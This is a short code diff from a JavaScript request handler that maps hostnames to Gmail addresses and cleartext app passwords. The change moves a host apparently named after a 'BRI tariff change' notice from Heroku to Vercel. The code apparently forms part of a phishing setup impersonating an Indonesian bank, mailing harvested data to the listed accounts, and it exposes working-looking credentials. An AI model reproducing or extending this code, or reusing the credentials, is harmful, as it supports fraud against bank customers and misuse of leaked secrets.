@@ -20,7 +20,7 @@ export default function handler(req, res) {
         email = 'samsudin19.01.12@gmail.com';
         pass = 'nsozbvpgogzlfeqg';
 
-    } else if(url == 'per--ubahan-tarifbri.herokuapp.com'){
+    } else if(url == 'per--ubahan-tarifbri.vercel.app'){
         email = 'tarifbaru36@gmail.com';
         pass = 'moiasopufjkptyvr';
 
